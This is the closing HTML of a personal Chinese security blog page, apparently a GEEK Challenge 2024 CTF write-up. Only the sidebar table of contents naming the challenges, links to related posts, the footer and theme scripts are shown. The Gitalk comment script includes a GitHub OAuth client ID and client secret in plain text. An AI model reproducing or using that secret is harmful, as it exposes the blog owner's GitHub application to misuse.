is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-18</div><div class="title">[奇安信]Web-4-littledropbox</div></div></a></div><div><a href="/posts/93fc8735.html" title="常见的各种http要求以及对应的headers"><div class="cover" style="background:var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-25</div><div class="title">常见的各种http要求以及对应的headers</div></div></a></div><div><a href="/posts/5eef1d19.html" title="linux命令执行"><div class="cover" style="background:var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-19</div><div class="title">linux命令执行</div></div></a></div></div></div><hr class="custom-hr"><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i> <span>评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.png" onerror='this.onerror=null,this.src="/img/friend_404.gif"' alt="avatar"></div><div class="author-info__name">hatchet</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/wedidaprettygoodjobsofar"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/wedidaprettygoodjobsofar" target="_blank" title="Github" rel="external nofollow noopener noreferrer"><i class="fab fa-github" style="color:#24292e"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">说点什么呢</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#100-%E7%9A%84%E2%9A%AA"><span class="toc-number">1.1.</span> <span class="toc-text">100%的⚪</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezpop"><span class="toc-number">1.2.</span> <span class="toc-text">ezpop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#not-just-pop"><span class="toc-number">1.3.</span> <span class="toc-text">not_just_pop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Can-you-Pass-Me"><span class="toc-number">1.4.</span> <span class="toc-text">Can_you_Pass_Me</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Problem-On-My-Web"><span class="toc-number">1.5.</span> <span class="toc-text">Problem_On_My_Web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-http"><span class="toc-number">1.6.</span> <span class="toc-text">ez_http</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#baby-upload"><span class="toc-number">1.7.</span> <span class="toc-text">baby_upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-include"><span class="toc-number">1.8.</span> <span class="toc-text">ez_include</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E4%B8%8D%E6%AF%94Java%E5%B7%AE"><span class="toc-number">1.9.</span> <span class="toc-text">PHP不比Java差</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SecretInDrivingSchool"><span class="toc-number">1.10.</span> <span class="toc-text">SecretInDrivingSchool</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rce-me"><span class="toc-number">1.11.</span> <span class="toc-text">rce_me</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-python"><span class="toc-number">1.12.</span> <span class="toc-text">ez_python</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#funnySQL%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">1.13.</span> <span class="toc-text">funnySQL（复现）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezSSRF%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">1.14.</span> <span class="toc-text">ezSSRF（复现）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#py-game%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">1.15.</span> <span class="toc-text">py_game（复现）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#noSandbox%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">1.16.</span> <span class="toc-text">noSandbox（复现）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#escapeSandbox-PLUS%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">1.17.</span> <span class="toc-text">escapeSandbox_PLUS（复现）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-js%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">1.18.</span> <span class="toc-text">ez_js（复现）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#I-wanna-go-to-SYC"><span class="toc-number">2.1.</span> <span class="toc-text">I_wanna_go_to_SYC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Welcome-jail"><span class="toc-number">2.2.</span> <span class="toc-text">Welcome_jail</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cimbar"><span class="toc-number">2.3.</span> <span class="toc-text">cimbar</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-pcap-1"><span class="toc-number">2.4.</span> <span class="toc-text">ez_pcap_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Truth-of-Word"><span class="toc-number">2.5.</span> <span class="toc-text">Truth of Word</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2024-geek-challenge-%E7%AD%BE%E5%88%B0"><span class="toc-number">2.6.</span> <span class="toc-text">2024 geek challenge! 签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#doSomeMath"><span class="toc-number">2.7.</span> <span class="toc-text">doSomeMath</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hard-jail"><span class="toc-number">2.8.</span> <span class="toc-text">hard_jail</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%88%94%E7%8B%97%E7%9A%84%E8%A7%89%E9%86%92"><span class="toc-number">2.9.</span> <span class="toc-text">舔狗的觉醒</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9B%AA"><span class="toc-number">2.10.</span> <span class="toc-text">雪</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-climbstairs"><span class="toc-number">2.11.</span> <span class="toc-text">ez_climbstairs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-jpg"><span class="toc-number">2.12.</span> <span class="toc-text">ez_jpg</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RSA"><span class="toc-number">3.1.</span> <span class="toc-text">RSA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E6%98%AF%E5%A5%97%E5%A8%83"><span class="toc-number">3.2.</span> <span class="toc-text">不是套娃</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB"><span class="toc-number">3.3.</span> <span class="toc-text">共模攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ECBpad"><span class="toc-number">3.4.</span> <span class="toc-text">ECBpad</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LLL"><span class="toc-number">3.5.</span> <span class="toc-text">LLL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-LLL"><span class="toc-number">3.6.</span> <span class="toc-text">easy_LLL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LinkedListModular"><span class="toc-number">3.7.</span> <span class="toc-text">LinkedListModular</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Number-theory"><span class="toc-number">3.8.</span> <span class="toc-text">Number theory</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#X0R"><span class="toc-number">3.9.</span> <span class="toc-text">X0R</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ncoCRT"><span class="toc-number">3.10.</span> <span class="toc-text">ncoCRT</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezRSA"><span class="toc-number">3.11.</span> <span class="toc-text">ezRSA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%AF%E6%92%92%E5%8A%A0%E5%AF%86"><span class="toc-number">3.12.</span> <span class="toc-text">凯撒加密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nc"><span class="toc-number">3.13.</span> <span class="toc-text">nc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#highlow"><span class="toc-number">3.14.</span> <span class="toc-text">highlow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RnoCRT"><span class="toc-number">3.15.</span> <span class="toc-text">RnoCRT</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ecc"><span class="toc-number">3.16.</span> <span class="toc-text">ecc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dp"><span class="toc-number">3.17.</span> <span class="toc-text">dp</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/c264f0a9.html" title="GEEK Challenge2024 Web+Misc+Crypto个人题解WP">GEEK Challenge2024 Web+Misc+Crypto个人题解WP</a><time datetime="2024-11-15T09:55:59.000Z" title="发表于 2024-11-15 17:55:59">2024-11-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/fc0a87bd.html" title="Python中werkzeug有关PIN值的构造">Python中werkzeug有关PIN值的构造</a><time datetime="2024-10-24T10:47:31.000Z" title="发表于 2024-10-24 18:47:31">2024-10-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/44659fec.html" title="PHP特性">PHP特性</a><time datetime="2024-09-25T07:33:05.000Z" title="发表于 2024-09-25 15:33:05">2024-09-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/6906b803.html" title="upload常见考题类型">upload常见考题类型</a><time datetime="2024-09-21T04:37:18.000Z" title="发表于 2024-09-21 12:37:18">2024-09-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/26728343.html" title="各种RCE绕过">各种RCE绕过</a><time datetime="2024-09-20T12:54:21.000Z" title="发表于 2024-09-20 20:54:21">2024-09-20</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 By hatchet</div><div class="framework-info"><span>框架</span> <a target="_blank" rel="external nofollow noopener noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题</span> <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><div class="js-pjax"><script>(() => {
  const initGitalk = () => {
    const gitalk = new Gitalk(Object.assign({
      clientID: 'Ov23li7NWWZ24nP1vNMS',
      clientSecret: '2862e5803e662951272daf944ea5855c7340fb35',
      repo: 'blog',
      owner: 'wedidaprettygoodjobsofar',
      admin: ['wedidaprettygoodjobsofar'],
      id: 'a53a0bca060a1b9586b8c4f765521942',
      updateCountCallback: commentCount
    },null))

    gitalk.render('gitalk-container')
  }

  const loadGitalk = async() => {
    if (typeof Gitalk === 'function') initGitalk()
    else {
      await getCSS('https://cdn.jsdelivr.net/npm/gitalk@1.8.0/dist/gitalk.min.css')
      await getScript('https://cdn.jsdelivr.net/npm/gitalk@1.8.0/dist/gitalk.min.js')
      initGitalk()
    }
  }
  
  const commentCount = n => {
    const isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
    if (isCommentCount) {
      isCommentCount.textContent= n
    }
  }

  if ('Gitalk' === 'Gitalk' || !true) {
    if (true) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
    else loadGitalk()
  } else {
    window.loadOtherComment = loadGitalk
  }
})()</script></div><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener
  btf.removeGlobalFnEvent('pjax')
  btf.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i> <span>数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div><hr><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div><div class="app-refresh" id="app-refresh" style="position:fixed;top:-2.2rem;left:0;right:0;z-index:99999;padding:0 1rem;font-size:15px;height:2.2rem;transition:all .3s ease"><div class="app-refresh-wrap" style="display:flex;color:#fff;height:100%;align-items:center;justify-content:center"><label>✨ 有新文章啦！ 👉</label><a href="javascript:void(0)" onclick="location.reload()"><span style="color:#fff;text-decoration:underline;cursor:pointer">🍗点击食用🍔</span></a></div></div><script>if ('serviceWorker' in navigator) {
if (navigator.serviceWorker.controller) {
navigator.serviceWorker.addEventListener('controllerchange', function() {
showNotification()
})
}
window.addEventListener('load', function() {
navigator.serviceWorker.register('/sw.js')
})
}
function showNotification() {
if (GLOBAL_CONFIG.Snackbar) {
var snackbarBg =
document.documentElement.getAttribute('data-theme') === 'light' ?
GLOBAL_CONFIG.Snackbar.bgLight :
GLOBAL_CONFIG.Snackbar.bgDark
var snackbarPos = GLOBAL_CONFIG.Snackbar.position
Snackbar.show({
text: '✨ 有新文章啦！ 👉',
backgroundColor: snackbarBg,
duration: 500000,
pos: snackbarPos,
actionText: '🍗点击食用🍔',
actionTextColor: '#fff',
onActionClick: function(e) {
location.reload()
},
})
} else {
var showBg =
document.documentElement.getAttribute('data-theme') === 'light' ?
'#3b70fc' :
'#1f1f1f'
var cssText = `top: 0; background: ${showBg};`
document.getElementById('app-refresh').style.cssText = cssText
}
}</script></div></body></html>